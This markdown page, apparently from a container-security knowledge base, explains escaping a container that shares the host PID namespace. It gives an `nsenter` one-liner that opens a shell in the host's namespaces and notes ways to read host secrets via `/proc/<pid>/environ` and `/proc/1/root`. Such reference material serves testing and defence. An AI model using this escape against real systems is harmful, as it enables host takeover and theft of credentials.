---
title: "Host PID namespace: escaping through shared host processes"
description: "Escaping a container that shares the host PID namespace by seeing every host process and using nsenter to enter a host process's mount and other namespaces, running code on the host, or reading host process memory and environments for secrets."
keywords:
  - hostPID
  - nsenter
  - host process
  - container escape
  - shared PID namespace
---

# Host PID namespace

With the host PID namespace shared, the container sees all host processes and their `/proc` entries. Given the capabilities to match (`CAP_SYS_ADMIN` for `nsenter`, or `CAP_SYS_PTRACE` for injection), it can enter a host process's namespaces and run on the host.

```bash
ps -ef | head                                   # host processes are visible
# Enter the host namespaces of init and run a shell on the host
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

## Exploitation notes

- `nsenter --target 1 --mount ... sh` is the canonical one-liner; it needs `CAP_SYS_ADMIN` and the shared PID namespace to resolve PID 1.
- Without `nsenter` rights, read host secrets through `/proc/<pid>/environ` and reach the host filesystem through `/proc/1/root`, covered in [Host process access](../sensitive-mounts/procfs-and-sysfs/host-process-access.md).
- With `CAP_SYS_PTRACE`, inject into a host process instead, as in [CAP_SYS_PTRACE](../privileged-configuration/capability-abuse/cap-sys-ptrace.md).

## References

- [man 1 nsenter](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [man 7 pid_namespaces](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)
